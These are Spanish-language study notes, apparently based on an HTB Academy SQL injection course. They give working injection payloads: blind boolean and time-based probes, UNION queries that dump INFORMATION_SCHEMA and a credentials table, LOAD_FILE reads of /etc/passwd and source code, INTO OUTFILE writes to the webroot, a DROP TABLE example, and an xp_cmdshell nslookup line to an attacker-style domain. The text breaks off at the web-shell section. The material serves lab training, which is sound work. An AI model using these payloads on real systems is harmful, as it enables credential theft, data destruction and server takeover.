---
tags:
  - Explotacion
  - Web
  - SQLI
---
[[0️⃣​ - SQL Injection Fundamentals]]  [[Sql_Injection_Fundamentals_Module_Cheat_Sheet.pdf]]

# Notas

## Blind

Este tipo de SQLI son las que no se muestran nada en el Front de la página, por lo que se va a ciegas.
Hay dos tipos dentro de estas:
### Boolean-Based

Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.

**Pasos:**
- Descubrir el número de columnas

Probar hasta que una no funcione

```sql
?id=1 ORDER BY 1 --  (funciona)
?id=1 ORDER BY 2 --  (funciona)
?id=1 ORDER BY 3 --  (error)
```

- Descubrir Nombre de la tabla

```sql
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name = 'usuarios') > 0 --
```

- Descubrir Nombre de la columna

```sql
?id=1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'usuarios' AND column_name = 'contraseña') > 0 --
```

```sql
?id=1 AND (SELECT CASE WHEN (EXISTS(SELECT contraseña FROM usuarios WHERE id=1)) THEN 1 ELSE 0 END) = 1 --
```

- Descubrir Valores

```sql
select(select substring(username,1,1) from users where id = 1)= 'b';
```

**EN EL CASO DE QUE TENGA RESTRINGIDO LAS COMILLAS LO HACEMOS MEDIANTE HEX**

```sql
select(select ascii(substring(username,1,1)) from users where id = 1)=97;
```

### Time-Based

Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional

Por ejemplo:

Si queremos ver el nombre de la base de datos podemos realizar lo siguiente:

```sql
select * from users where id = 1 and if(substr(database(),1,1)='a',sleep(5),1);
```

Con restricción de comillas:

```sql
select * from users where id = 1 and if(substr(ascii(database(),1,1))=97,sleep(5),1);
```

Esto lo comprueba es si la primera letra del nombre de la base de datos es 'a'. En el caso de que tarde 5 segundos, es que el condicional nos a mostrado que es correcto.

# HTB Academy

Una inyección SQL se produce cuando la entrada de usuario se introduce en la cadena de consulta SQL sin desinfectar o filtrar correctamente la entrada. El ejemplo anterior mostró cómo se puede usar la entrada de usuario dentro de una consulta SQL, y no usó ninguna forma de desinfección de entrada:

Código: php

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

En casos típicos, el `searchInput` se ingresaría para completar la consulta, devolviendo el resultado esperado. Cualquier entrada que escribimos entra en la siguiente consulta SQL:

Código: sql

```sql
select * from logins where username like '%$searchInput'
```

Entonces, si ingresamos `admin`él se convierte `'%admin'`. En este caso, si escribimos algún código SQL, solo se consideraría como un término de búsqueda. Por ejemplo, si ingresamos `SHOW DATABASES;`, se ejecutaría como `'%SHOW DATABASES;'` La aplicación web buscará nombres de usuario similares a `SHOW DATABASES;`. Sin embargo, como no hay desinfección, en este caso **podemos agregar una sola cita (`'`), que terminará el campo de entrada del usuario, y después de él, podemos escribir código SQL real**. Por ejemplo, si buscamos `1'; DROP TABLE users;`, la entrada de búsqueda sería:

Código: php

```php
'%1'; DROP TABLE users;'
```

Observe cómo agregamos una sola cita (') después de "1", para escapar de los límites de la entrada de usuario en ('%$searchInput').

Entonces, la consulta SQL final ejecutada sería la siguiente:

Código: sql

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

Como podemos ver en el resaltado de sintaxis, podemos escapar de los límites de la consulta original y también ejecutar nuestra consulta recién inyectada. `Once the query is run, the` usuarios `table will get deleted.`

>**NOTA**:
>En el ejemplo anterior, en aras de la simplicidad, agregamos otra consulta SQL después de un punto y coma (;). Aunque esto en realidad no es posible con MySQL, es posible con MSSQL y PostgreSQL. En las próximas secciones, discutiremos los métodos reales de inyección de consultas SQL en MySQL.

### Errores de Sintaxis

El ejemplo anterior de inyección SQL devolvería un error:

Código: php

```php
Error: near line 1: near "'": syntax error
```

Esto se debe al último personaje final, donde tenemos una sola cita adicional (`'`) que no está cerrado, lo que provoca un error de sintaxis SQL cuando se ejecuta:

Código: sql

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

En este caso, solo teníamos un carácter final, ya que nuestra entrada de la consulta de búsqueda estaba cerca del final de la consulta SQL. Sin embargo, la entrada del usuario generalmente va en el medio de la consulta SQL, y el resto de la consulta SQL original viene después.

Para tener una inyección exitosa, debemos asegurarnos de que la consulta SQL recién modificada siga siendo válida y no tenga ningún error de sintaxis después de nuestra inyección. En la mayoría de los casos, no tendríamos acceso al código fuente para encontrar la consulta SQL original y desarrollar una inyección SQL adecuada para realizar una consulta SQL válida. Entonces, ¿cómo podríamos inyectar en la consulta SQL con éxito?

Una respuesta es usando `comments`, y discutiremos esto en una sección posterior. Otra es hacer que la sintaxis de la consulta funcione pasando múltiples comillas individuales, como discutiremos a continuación (`'`).

Ahora que entendemos los conceptos básicos de las inyecciones SQL, comencemos a aprender algunos usos prácticos.

## Tipos de inyecciones SQL

Las inyecciones SQL se clasifican en función de cómo y dónde recuperamos su salida.

![dbms_arquitectura](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)

### In-band

La salida tanto de la consulta prevista como de la nueva puede imprimirse directamente en el front-end y podemos leerla directamente.

Tiene dos tipos:
#### Union Based

Es posible que se tenga que especificar la ubicación exacta (columna) que tenemos que leer, por lo que la consulta dirigirá la salida que se imprimirá allí.

- Este método utiliza el operador `UNION` de SQL para combinar múltiples consultas en una sola.
- Permite al atacante recuperar datos de otras tablas en la base de datos si la consulta original no tiene restricciones adecuadas.

Ejemplo:

```
SELECT nombre, correo FROM usuarios WHERE id = 1 UNION SELECT nombre, contraseña FROM administradores;
```


#### Error Based

En cuanto a `Error Based` inyección SQL, se utiliza cuando podemos conseguir el `PHP` o `SQL` errores en el front-end, por lo que podemos causar intencionalmente un error SQL que devuelve la salida de nuestra consulta.

- Se basa en provocar errores en la base de datos para obtener información sobre su estructura o contenido.
- Los mensajes de error pueden exponer información sensible como nombres de tablas, columnas, o tipos de datos.

Ejemplo:

```
SELECT * FROM usuarios WHERE id = 1 AND CONVERT(int, 'texto');
```

Esto podría generar un error indicando la incompatibilidad de tipos y revelando detalles técnicos.

### Blind

No se imprime la salida, por lo que se puede utilizar la lógica SQL para recuperar el carácter de salida por carácter.
En este tipo, el atacante no recibe directamente datos en respuesta, pero puede inferir información basándose en el comportamiento de la aplicación.

Tiene dos tipos:

#### Boolean Based

Se puede usar sentencias condicionales SQL para controlar si la página devuelve alguna salida, es decir, respuesta de consulta original si devuelve nuestra instrucción condicional `true`.

- El atacante envía una consulta que evalúa una condición booleana (`TRUE` o `FALSE`) y observa el comportamiento de la página.
- Basado en la respuesta (si carga o no, o si muestra contenido diferente), puede deducir la información de la base de datos.

Ejemplo:

```
SELECT * FROM usuarios WHERE id = 1 AND 1=1; -- La consulta es válida. SELECT * FROM usuarios WHERE id = 1 AND 1=2; -- La consulta no devuelve resultados.
```


#### Time Based

Se utiliza sentencias condicionales SQL que restrasan la respuesta de la página si la instruccion condicional devuelve `true` usando la función `Sleep()`.

- Se utiliza una función que retrasa la respuesta del servidor para determinar si la consulta es verdadera o falsa.
- Si el servidor tarda en responder, el atacante deduce que la condición es verdadera.

Ejemplo:

```
SELECT IF(1=1, SLEEP(5), 0); -- Si 1=1 es verdadero, el servidor se "duerme" por 5 segundos. SELECT IF(1=2, SLEEP(5), 0); -- No hay retraso porque la condición es falsa.
```


### Out-of-band

No se tiene acceso a la salida en absoluto, por lo que es posible que tengamos que dirigir la salida a una ubicación remota, es decir, registro DNS, y luego intentar recuperarla desde allí.

En este tipo, el atacante utiliza un canal diferente al principal para recibir los datos. Es menos común pero muy útil si los otros métodos no son viables.

- Puede involucrar consultas que envían datos a un servidor controlado por el atacante (por ejemplo, usando DNS o HTTP).

Ejemplo:

```
SELECT nombre FROM usuarios WHERE id = 1; EXEC xp_cmdshell('nslookup datos.atacante.com');
```

Aquí, los datos extraídos son enviados a un dominio externo.


## Descubrimiento de vulnerabilidad

Intentaremos añadir una de las siguientes cargas útiles después de nuestro nombre de usuario y ver si causa algún error o cambia el comportamiento de la página:

| Carga útil | URL Codificada |
| ---------- | -------------- |
| `'`        | `%27`          |
| `"`        | `%22`          |
| `#`        | `%23`          |
| `;`        | `%3B`          |
| `)`        | `%29`          |

Por ejemplo:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

![quite_error](https://academy.hackthebox.com/storage/modules/33/quote_error.png)

Vemos que se lanzó un error SQL en lugar del `Login Failed` mensaje. La página arrojó un error porque la consulta resultante fue:

>**Nota:** 
>En algunos casos, es posible que tengamos que usar la versión codificada por URL de la carga útil. Un ejemplo de esto es cuando ponemos nuestra carga útil directamente en la URL, es decir. HTTP GET solicitud'.


## Técnicas


### Orden de operadores

En la consulta SQL, el operador `AND` se realiza antes que el operador `OR` por lo que si hay una condición al lado de `OR` que sea `true`, la consulta será correcta.

Ejemplo: 

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```


![notadmin_diagrama](https://academy.hackthebox.com/storage/modules/33/notadmin_diagram_1.png)

### Uso de comentario

Hay tres tipos de comentarios.
- Comentario de linea
	- `--`
		- En SQL, usar dos guiones solo no es suficiente para iniciar un comentario. Por lo tanto, tiene que haber un espacio vacío después de ellos, por lo que el comentario comienza con (-- ), con un espacio al final. Esto a veces se codifica URL como (--+), ya que los espacios en URL se codifican como (+). Para dejarlo claro, agregaremos otro (-) al final (-- -), para mostrar el uso de un personaje espacial.
	- `#`
		- si está ingresando su carga útil en la URL dentro de un navegador, un símbolo (#) generalmente se considera como una etiqueta y no se pasará como parte de la URL. Para usar (#) como comentario dentro de un navegador, podemos usar '%23', que es un símbolo codificado por URL (#).
- Comentario de párrafos (no se suele utilizar)
	- `/**/`


Ejemplos:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```


ad') OR id = '5'; -- - 

```
SELECT * FROM logins WHERE (username='ad') OR id = '5'; -- - ' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```


### Operador UNION

Dicho operador junta las tablas en una sola con la `condición de que tengan el mismo número de columnas`.

En el caso de que no tengan el mismo numero de columnas, podemos poner datos basura en el select para poder llegar al numero de columnos de la otra tabla.

Ejemplo:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

```
select count(*) as total from (
select * from employees 
UNION 
select dept_no, dept_name, NULL, NULL, NULL, NULL from departments
) as aaunion;
```

LAS NOTAS SON IMPORTANTES

>**Nota:** 
>Al rellenar otras columnas con datos basura, debemos asegurarnos de que el tipo de datos coincida con el tipo de datos de columnas, de lo contrario la consulta devolverá un error. En aras de la simplicidad, usaremos números como nuestros datos basura, que también serán útiles para rastrear nuestras posiciones de carga útil, como discutiremos más adelante.

>**Consejo:** 
>Para la inyección SQL avanzada, es posible que deseemos simplemente usar 'NULL' para llenar otras columnas, ya que 'NULL' se adapta a todos los tipos de datos.

## Identificar número de columnas

La primera forma de detectar el número de columnas es a través del `ORDER BY` función, que discutimos anteriormente. Tenemos que inyectar una consulta que ordene los resultados por una columna que especificamos, 'es decir, columna 1, columna 2, etc.', hasta que obtengamos un error que diga que la columna especificada no existe.

Por ejemplo, podemos empezar con `order by 1`, ordene por la primera columna y tenga éxito, ya que la tabla debe tener al menos una columna. Entonces lo haremos `order by 2` y luego `order by 3` hasta que lleguemos a un número que devuelva un error, o la página no muestre ninguna salida, lo que significa que este número de columna no existe. La columna final exitosa por la que clasificamos con éxito nos da el número total de columnas.

Si fallamos en `order by 4`esto significa que la tabla tiene tres columnas, que es el número de columnas que pudimos ordenar con éxito. Volvamos a nuestro ejemplo anterior e intentemos lo mismo, con la siguiente carga útil:

```sql
' order by 1-- -
```

Recordatorio: Estamos agregando un guión adicional (-) al final, para mostrarle que hay un espacio después (--).

---

Si utilizamos una UNION con una tabla que no sabemos cual columno nos esta mostrando, con lo siguiente nos puede mostrar las columnas que nos muestran:

```sql
cn' UNION select 1,2,3,4-- -
```


![](https://academy.hackthebox.com/storage/modules/33/ports_columns_correct.png)


## Enumeración de la base de datos


Antes de enumerar la base de datos, generalmente necesitamos identificar el tipo de DBMS con el que estamos tratando. Esto se debe a que cada DBMS tiene consultas diferentes, y saber qué es nos ayudará a saber qué consultas usar.

Como suposición inicial, si el servidor web que vemos en las respuestas HTTP es `Apache` o `Nginx`, es una buena suposición que el servidor web se está ejecutando en Linux, por lo que es probable que el DBMS `MySQL`. Lo mismo se aplica a Microsoft DBMS si el servidor web es `IIS`, por lo que es probable que sea `MSSQL`. Sin embargo, esta es una suposición descabellada, ya que muchas otras bases de datos se pueden usar en el sistema operativo o en el servidor web. Por lo tanto, hay diferentes consultas que podemos probar para tomar las huellas dactilares del tipo de base de datos con la que estamos tratando.

### Huellas en MySQL


| Carga útil         | Cuándo Usar                                | Salida Esperada                                                      | Salida Incorrecta                                         |
| ------------------ | ------------------------------------------ | -------------------------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | Cuando tenemos salida de consulta completa | Versión MySQL 'i.e. `10.3.22-MariaDB-1ubuntu1`'                      | En MSSQL devuelve la versión MSSQL. Error con otros DBMS. |
| `SELECT POW(1,1)`  | Cuando solo tenemos salida numérica        | `1`                                                                  | Error con otros DBMS                                      |
| `SELECT SLEEP(5)`  | Ciego/Sin Salida                           | Retrasa la respuesta de la página durante 5 segundos y devuelve `0`. | No retrasará la respuesta con otros DBMS                  |

```sql
cn' UNION select 1,@@version,user(),4-- -
```


#### BASE de datos INFORMATION_SCHEMA

Para extraer datos de tablas usando `UNION SELECT`, necesitamos formar correctamente nuestro `SELECT` consultas. Para ello, necesitamos la siguiente información:

- Lista de bases de datos
- Lista de tablas dentro de cada base de datos
- Lista de columnas dentro de cada tabla

Con la información anterior, podemos formar nuestro `SELECT` instrucción para volcar datos de cualquier columna en cualquier tabla dentro de cualquier base de datos dentro del DBMS. Aquí es donde podemos utilizar el `INFORMATION_SCHEMA` Base de datos.

El [INFORMACIÓN_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) la base de datos contiene metadatos sobre las bases de datos y tablas presentes en el servidor. Esta base de datos juega un papel crucial al explotar las vulnerabilidades de inyección SQL. Como se trata de una base de datos diferente, no podemos llamar a sus tablas directamente con un `SELECT` declaración. Si solo especificamos el nombre de una tabla para un `SELECT` declaración, buscará tablas dentro de la misma base de datos.

Entonces, para hacer referencia a una tabla presente en otro DB, podemos usar el punto ‘`.`’ operador. Por ejemplo, para `SELECT` una mesa `users` presente en una base de datos nombrada `my_database`, podemos usar:

Código: sql

```sql
SELECT * FROM my_database.users;
```

Del mismo modo, podemos ver las tablas presentes en el `INFORMATION_SCHEMA` Base de datos.

#### Schema

Para comenzar nuestra enumeración, debemos encontrar qué bases de datos están disponibles en el DBMS. La mesa [ESQUEMAS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) en el `INFORMATION_SCHEMA` la base de datos contiene información sobre todas las bases de datos en el servidor. Se utiliza para obtener nombres de bases de datos para que luego podamos consultarlos. El `SCHEMA_NAME` la columna contiene todos los nombres de bases de datos actualmente presentes.

Primero probemos esto en una base de datos local para ver cómo se usa la consulta:

  Enumeración de bases de datos

```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

Vemos el `ilfreight` y `dev` bases de datos.

Nota: Las tres primeras bases de datos son bases de datos MySQL predeterminadas y están presentes en cualquier servidor, por lo que generalmente las ignoramos durante la enumeración de DB. A veces también hay un cuarto 'sys' DB.

Ahora, hagamos lo mismo usando un `UNION` Inyección SQL, con la siguiente carga útil:


```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Una vez más, vemos dos bases de datos, `ilfreight` y `dev`, aparte de los predeterminados. Averigüemos de qué base de datos se está ejecutando la aplicación web para recuperar datos de puertos. Podemos encontrar la base de datos actual con el `SELECT database()` consulta. Podemos hacer esto de manera similar a cómo encontramos la versión DBMS en la sección anterior:

Código: sql

```sql
cn' UNION select 1,database(),2,3-- -
```

### TABLAS

Antes de volcar datos del `dev` base de datos, necesitamos obtener una lista de las tablas para consultarlas con un `SELECT` declaración. Para encontrar todas las tablas dentro de una base de datos, podemos usar el `TABLES` mesa en el `INFORMATION_SCHEMA` Base de datos.

El [TABLAS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) la tabla contiene información sobre todas las tablas en toda la base de datos. Esta tabla contiene múltiples columnas, pero estamos interesados en el `TABLE_SCHEMA` y `TABLE_NAME` columnas. El `TABLE_NAME` la columna almacena nombres de tablas, mientras que el `TABLE_SCHEMA` la columna apunta a la base de datos a la que pertenece cada tabla. Esto se puede hacer de manera similar a cómo encontramos los nombres de la base de datos. Por ejemplo, podemos usar la siguiente carga útil para encontrar las tablas dentro del `dev` base de datos:

Código: sql

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Observe cómo reemplazamos los números '2' y '3' con 'TABLE_NAME' y 'TABLE_SCHEMA', para obtener la salida de ambas columnas en la misma consulta.

![](https://academy.hackthebox.com/storage/modules/33/ports_tables_1.jpg)

Nota: agregamos una condición (donde table_schema='dev') para devolver solo tablas de la base de datos 'dev', de lo contrario obtendríamos todas las tablas en todas las bases de datos, que pueden ser muchas.

Vemos cuatro tablas en la base de datos de desarrollo, a saber `credentials`, `framework`, `pages`, y `posts`. Por ejemplo, el `credentials` la tabla podría contener información confidencial para investigarla.


### COLUMNAS

Para volcar los datos de la `credentials` tabla, primero necesitamos encontrar los nombres de columna en la tabla, que se pueden encontrar en el `COLUMNS` mesa en el `INFORMATION_SCHEMA` base de datos. El [COLUMNAS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) la tabla contiene información sobre todas las columnas presentes en todas las bases de datos. Esto nos ayuda a encontrar los nombres de columna para consultar una tabla. El `COLUMN_NAME`, `TABLE_NAME`, y `TABLE_SCHEMA` las columnas se pueden utilizar para lograr esto. Como lo hicimos antes, intentemos esta carga útil para encontrar los nombres de las columnas en el `credentials` tabla:

Código: sql

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

   

![](https://academy.hackthebox.com/storage/modules/33/ports_columns_1.jpg)

La tabla tiene dos columnas nombradas `username` y `password`. Podemos usar esta información y volcar datos de la tabla.


### Datos

Ahora que tenemos toda la información, podemos formar nuestra `UNION` consulta para volcar datos de la `username` y `password` columnas de la `credentials` mesa en el `dev` base de datos. Podemos colocar `username` y `password` en lugar de las columnas 2 y 3:

Código: sql

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Recuerde: no olvide usar el operador de puntos para referirse a las 'credenciales' en la base de datos 'dev', ya que nos estamos ejecutando en la base de datos 'ilfreight', como se discutió anteriormente.

   

![](https://academy.hackthebox.com/storage/modules/33/ports_credentials_1.png)



## Variables para la enumeración

### MYSQL

| Variable             | Esplicación                                       |
| -------------------- | ------------------------------------------------- |
| `@@version`          | Versión de la base de datos                       |
| `POW(1,1)`           | Cuando solo tenemos salida numérica               |
| `SLEEP(5)`           | Ciego/Sin Salida                                  |
| `INFORMATION_SCHEMA` | Contiene información general de la base de datos. |
|                      | Valores adjuntos:                                 |
|                      | .SCHEMATA                                         |
|                      | .TABLES                                           |
|                      | .COLUMNS                                          |
| `TABLE_NAME`         | Nombre del nombre de la tabla.                    |
| `TABLE_SCHEMA`       | Nombre de la base de datos de dicha tabla         |
| `COLUMN_NAME`        | Nombre de la columna                              |
| `SCHEMA_NAME`        | Nombre de la base de datos                        |


## Lectura de archivos

Primero tenemos que ver que privilegios de usuario tenemos dentro de la base de datos para decidir si leeremos y/o escribiremos archivos en el servidor back-end.

### Identificar mi usuario
 
 Para poder `encontrar a nuestro usuario actual de DB`, podemos utilizar cualquiera de las siguientes consultas:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Nuestro `UNION` la carga útil de inyección será la siguiente:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

o:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```


### Búsqueda de privilegios

Ahora que conocemos a nuestro usuario, podemos empezar a buscar qué privilegios tenemos con ese usuario. En primer lugar, podemos probar si tenemos privilegios de súper administrador con la siguiente consulta:

Código: sql

```sql
SELECT super_priv FROM mysql.user
```

Una vez más, podemos utilizar la siguiente carga útil con la consulta anterior:


```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

Si tuviéramos muchos usuarios dentro del DBMS, podemos agregar `WHERE user="root"` para mostrar solo privilegios para nuestro usuario actual `root`:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

---

La consulta devuelve `Y`, lo que significa `YES`, indicando privilegios de superusuario. También podemos volcar otros privilegios que tenemos directamente desde el esquema, con la siguiente consulta:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Desde aquí, podemos agregar `WHERE grantee="'root'@'localhost'"` para mostrar solo a nuestro usuario actual `root` privilegios. Nuestra carga útil sería:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Y vemos todos los privilegios posibles dados a nuestro usuario actual:

   

![](https://academy.hackthebox.com/storage/modules/33/root_privs_2.jpg)

Vemos que el `FILE` privilege aparece para nuestro usuario, lo que nos permite leer archivos e incluso escribir archivos. Por lo tanto, podemos proceder con el intento de leer archivos.


### LOAD_FILE

Ahora que sabemos que tenemos suficientes privilegios para leer los archivos del sistema local, hagamos eso usando el `LOAD_FILE()` función. El [LOAD_ARCHIVO()](https://mariadb.com/kb/en/load_file/) la función se puede utilizar en MariaDB / MySQL para leer datos de archivos. La función toma solo un argumento, que es el nombre del archivo. La siguiente consulta es un ejemplo de cómo leer el `/etc/passwd` archivo:


```sql
SELECT LOAD_FILE('/etc/passwd');
```

>**Nota:** 
Solo podremos leer el archivo si el usuario del SO que ejecuta MySQL tiene suficientes privilegios para leerlo.

Similar a cómo hemos estado usando un `UNION` inyección, podemos utilizar la consulta anterior:


```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

---

También podemos leer el código fuente de la pagina:

Sabemos que la página actual es `search.php`. El webroot predeterminado de Apache es `/var/www/html`. Intentemos leer el código fuente del archivo en `/var/www/html/search.php`.


```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```


   

![](https://academy.hackthebox.com/storage/modules/33/load_file_search.png)

Sin embargo, la página termina renderizando el código HTML dentro del navegador. La fuente HTML se puede ver presionando `[Ctrl + U]`.

![load_archivo_fuente](https://academy.hackthebox.com/storage/modules/33/load_file_source.png)


>**NOTA:**
>En el caso como este que la variable $conn no esta definida en el propio script, quiere decir que la esta sacando de otro script que se ha incluido con un **include**.
>Para ello tenemos que ver todo el código fuente para identificar el nombre del otro archivo que tendrá la contraseña de la base de datos.

## Escritura de archivos

Cuando se trata de escribir archivos en el servidor de back-end, se vuelve mucho más restringido en los DBMS modernos, ya que podemos utilizar esto para escribir un shell web en el servidor remoto, obteniendo así la ejecución de código y haciéndose cargo del servidor. Esta es la razón por la cual los DBMS modernos deshabilitan la escritura de archivos de forma predeterminada y requieren ciertos privilegios para que los DBA escriban archivos. Antes de escribir archivos, primero debemos verificar si tenemos suficientes derechos y si el DBMS permite escribir archivos.

### Escribir privilegios de archivos

Para poder escribir archivos en el servidor de back-end utilizando una base de datos MySQL, necesitamos tres cosas:

1. Usuario con `FILE` privilegio habilitado
2. MySQL global `secure_file_priv` variable no habilitada
3. Escriba el acceso a la ubicación en la que queremos escribir en el servidor de back-end

Ahora debemos comprobar si la base de datos MySQL tiene ese privilegio. Esto se puede hacer comprobando el `secure_file_priv` variable global.

##### seguro_archivo_priv

El [seguro_archivo_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) la variable se usa para determinar de dónde leer/escribir archivos. Un valor vacío nos permite leer archivos de todo el sistema de archivos. De lo contrario, si se establece un directorio determinado, solo podemos leer desde la carpeta especificada por la variable. Por otro lado, `NULL` significa que no podemos leer/escribir desde ningún directorio. MariaDB tiene esta variable configurada para vaciar de forma predeterminada, lo que nos permite leer/escribir en cualquier archivo si el usuario tiene el `FILE` privilegio. Sin embargo, `MySQL` usos `/var/lib/mysql-files` como la carpeta predeterminada. Esto significa que leer archivos a través de un `MySQL` la inyección no es posible con la configuración predeterminada. Peor aún, algunas configuraciones modernas predeterminan `NULL`, lo que significa que no podemos leer/escribir archivos en ningún lugar dentro del sistema.

Entonces, veamos cómo podemos averiguar el valor de `secure_file_priv`. Dentro `MySQL`, podemos utilizar la siguiente consulta para obtener el valor de esta variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Sin embargo, ya que estamos usando un `UNION` inyección, tenemos que conseguir el valor usando un `SELECT` declaración. Esto no debería ser un problema, ya que todas las variables y la mayoría de las configuraciones se almacenan dentro del `INFORMATION_SCHEMA` base de datos. `MySQL` las variables globales se almacenan en una tabla llamada [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), y según la documentación, esta tabla tiene dos columnas `variable_name` y `variable_value`.

Tenemos que seleccionar estas dos columnas de esa tabla en el `INFORMATION_SCHEMA` base de datos. Hay cientos de variables globales en una configuración MySQL, y no queremos recuperarlas todas. Luego filtraremos los resultados para mostrar solo el `secure_file_priv` variable, usando el `WHERE` cláusula que aprendimos en una sección anterior.

La consulta SQL final es la siguiente:

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

Entonces, similar a otro `UNION` consultas de inyección, podemos obtener el resultado de la consulta anterior con la siguiente carga útil. Recuerde agregar dos columnas más `1` y `4` como datos basura para tener un total de 4 columnas':

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Si el resultado muestra que el `secure_file_priv` el valor está vacío, lo que significa que podemos leer/escribir archivos en cualquier ubicación.


### SELECCIONAR EN EL ARCHIVO DE SALIDA

Ahora que hemos confirmado que nuestro usuario debe escribir archivos en el servidor de back-end, intentemos hacerlo usando el `SELECT .. INTO OUTFILE` declaración. El [SELECCIONAR EN EL ARCHIVO DE SALIDA](https://mariadb.com/kb/en/select-into-outfile/) la instrucción se puede utilizar para escribir datos de consultas seleccionadas en archivos. Esto se usa generalmente para exportar datos de tablas.

Para usarlo, podemos agregar `INTO OUTFILE '...'` después de nuestra consulta para exportar los resultados al archivo que especificamos. El siguiente ejemplo guarda la salida de la `users` mesa en el `/tmp/credentials` archivo:

  Escribir Archivos

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

Si vamos al servidor back-end y `cat` el archivo, vemos el contenido de esa tabla:

  Escribir Archivos

```shell-session
vcrdcr@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

También es posible directamente `SELECT` cadenas en archivos, lo que nos permite escribir archivos arbitrarios en el servidor de back-end.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

Cuando nosotros `cat` el archivo, vemos ese texto:

  Escribir Archivos

```shell-session
vcrdcr@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

  Escribir Archivos

```shell-session
vcrdcr@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

Como podemos ver arriba, el `test.txt` el archivo fue creado con éxito y es propiedad de la `mysql` usuario.

>**Consejo:**
> Las exportaciones avanzadas de archivos utilizan la función 'FROM_BASE64("base64_data")' para poder escribir archivos largos/avanzados, incluidos datos binarios.




### Escribir archivos a través de la inyección SQL

Intentemos escribir un archivo de texto en la raíz web y verifiquemos si tenemos permisos de escritura. La siguiente consulta debe escribir `file written successfully!` a la `/var/www/html/proof.txt` archivo, al que luego podemos acceder en la aplicación web:

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

**Nota:** Para escribir un shell web, debemos conocer el directorio web base para el servidor web (es decir, raíz web). Una forma de encontrarlo es usarlo `load_file` para leer la configuración del servidor, como la configuración de Apache que se encuentra en `/etc/apache2/apache2.conf`, la configuración de Nginx en `/etc/nginx/nginx.conf`, o configuración de IIS en `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, o podemos buscar en línea otras posibles ubicaciones de configuración. Además, podemos ejecutar un escaneo fuzzing e intentar escribir archivos a diferentes raíces web posibles, utilizando [esta lista de palabras para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) o [esta lista de palabras para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finalmente, si ninguno de los anteriores funciona, podemos usar los errores del servidor que se nos muestran e intentar encontrar el directorio web de esa manera.

El `UNION` la carga útil de inyección sería la siguiente:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```


### Escribir un Web Shell

Habiendo confirmado los permisos de escritura, podemos seguir adelante y escribir un shell web PHP en la carpeta webroot. Podemos escribir el siguiente webshell PHP para poder ejecutar comandos directamente en el servidor back-end:

```php
